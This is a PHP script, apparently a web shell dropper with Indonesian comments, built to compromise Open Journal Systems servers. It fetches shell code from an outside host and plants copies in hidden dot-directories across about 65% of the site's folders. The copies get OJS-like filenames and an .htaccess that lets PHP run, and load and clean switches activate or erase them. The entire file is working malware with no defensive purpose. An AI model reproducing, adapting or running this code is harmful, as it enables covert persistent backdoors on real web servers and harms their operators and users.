<?php
// dropper.php â€” Eksekusi backend saja

$remote_urls = [
    'https://el-gasci.site/shhtt/uploader%3F',
    'https://el-gasci.site/shhtt/uploader%3F',
    'https://el-gasci.site/shhtt/uploader%3F'
];

$base_dir = __DIR__;
$log_file = __DIR__ . '/result.txt';

$natural_filenames = [
    'index.php', 'config.inc.php', 'install.php', 'upgrade.php',
    'SubmissionHandler.inc.php', 'LoginHandler.inc.php', 'UserHandler.inc.php',
    'Issue.inc.php', 'Article.inc.php', 'User.inc.php',
    'Validation.inc.php', 'Request.inc.php', 'Dispatcher.inc.php',
    'DAO.inc.php', 'Mail.inc.php', 'Site.inc.php', 'Journal.inc.php',
    'PluginRegistry.inc.php', 'PKPApplication.inc.php', 'TemplateManager.inc.php'
];

// Contoh nama direktori tersembunyi atau sistem internal pada struktur OJS
$hidden_dir_names = [
    '.cache', '.sessions', '.logs', '.lib', '.pkp', '.ojs2', '.plugins', '.compiled',
    '.templates', '.registry', '.config', '.locale', '.help', '.db', '.emailTemplates',
    '.submissionFiles', '.public', '.api', '.router', '.pages', '.classes',
    '.handlers', '.scripts', '.filters', '.controllers', '.forms', '.metadata',
    '.install', '.security', '.submission', '.user', '.editor', '.manager',
    '.site', '.journal', '.admin', '.context', '.publication', '.galley',
    '.access', '.review', '.decisions', '.workflow', '.notification'
];

function logPath($log_file, $message) {
    $timestamp = date('Y-m-d H:i:s');
    $formatted = "[$timestamp] $message\n";
    @file_put_contents($log_file, $formatted, FILE_APPEND | LOCK_EX);
}

function getAllValidDirs($base) {
    $dirs = [];
    $rii = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($base, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    foreach ($rii as $file) {
        if ($file->isDir()) {
            $path = $file->getPathname();
            if (preg_match('#/(\.git|\.idea|vendor|node_modules)#i', $path)) continue;
            $dirs[] = $path;
        }
    }
    return array_unique($dirs);
}

function dropShell($remote_url, $target_dir, $log_file) {
    global $natural_filenames, $hidden_dir_names;

    $shell_code = @file_get_contents($remote_url);
    if (!$shell_code || strlen(trim($shell_code)) < 10) {
        $ch = curl_init($remote_url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (ShellDropper)',
        ]);
        $shell_code = curl_exec($ch);
        curl_close($ch);
    }

    if (!$shell_code || strlen(trim($shell_code)) < 10) {
        logPath($log_file, "[ERROR] Gagal mengambil shell dari URL: $remote_url");
        return false;
    }

    $random_dir = $hidden_dir_names[array_rand($hidden_dir_names)];
    $hidden_dir = rtrim($target_dir, '/\\') . DIRECTORY_SEPARATOR . $random_dir;

    if (!is_dir($hidden_dir)) {
        if (!@mkdir($hidden_dir, 0755, true)) {
            logPath($log_file, "[DENIED] Tidak bisa membuat folder: $hidden_dir");
            return false;
        }
    }

    $htaccess_path = $hidden_dir . '/.htaccess';
    if (!file_exists($htaccess_path)) {
        @file_put_contents($htaccess_path, "Options -Indexes\n<FilesMatch \\.(php|inc)$>\nAllow from all\n</FilesMatch>\n");
    }

    $filename = $natural_filenames[array_rand($natural_filenames)];
    $fullpath = $hidden_dir . DIRECTORY_SEPARATOR . $filename;

    if (file_exists($fullpath)) {
        logPath($log_file, "[SKIP] File sudah ada: $fullpath");
        return false;
    }

    if (!is_writable($hidden_dir)) {
        logPath($log_file, "[DENIED] Tidak bisa menulis ke direktori: $hidden_dir");
        return false;
    }

    $result = @file_put_contents($fullpath, $shell_code);
    if ($result === false) {
        logPath($log_file, "[FAIL] Gagal menulis ke file: $fullpath");
        return false;
    }

    $real = realpath($fullpath);
    logPath($log_file, "[OK] Berhasil drop: $real");
    return $real;
}

function loadShells($log_file) {
    if (!file_exists($log_file)) return;
    foreach (file($log_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $line) {
        if (preg_match('/\] (.+)$/', $line, $m)) {
            $path = trim($m[1]);
            if (is_file($path)) include_once $path;
        }
    }
}

function cleanShells($log_file) {
    if (!file_exists($log_file)) return;
    foreach (file($log_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $line) {
        if (preg_match('/\] (.+)$/', $line, $m)) {
            $path = trim($m[1]);
            if (is_file($path)) @unlink($path);
        }
    }
    @unlink($log_file);
}

if (isset($_GET['load'])) { loadShells($log_file); exit; }
if (isset($_GET['clean'])) { cleanShells($log_file); exit; }

$dirs = getAllValidDirs($base_dir);
shuffle($dirs);

$total_targets = count($dirs);
$spread_count = (int) ceil($total_targets * 0.65);
$targets = array_slice($dirs, 0, $spread_count);
$batch_size = ceil($spread_count / count($remote_urls));

$success = 0;
foreach ($targets as $i => $dir) {
    $remote_url = $remote_urls[floor($i / $batch_size) % count($remote_urls)];
    if (dropShell($remote_url, $dir, $log_file)) {
        $success++;
    }
}

header('Content-Type: application/json');
echo json_encode([
    'status' => 'ok',
    'success' => $success,
    'log_file' => basename($log_file),
]);
exit;
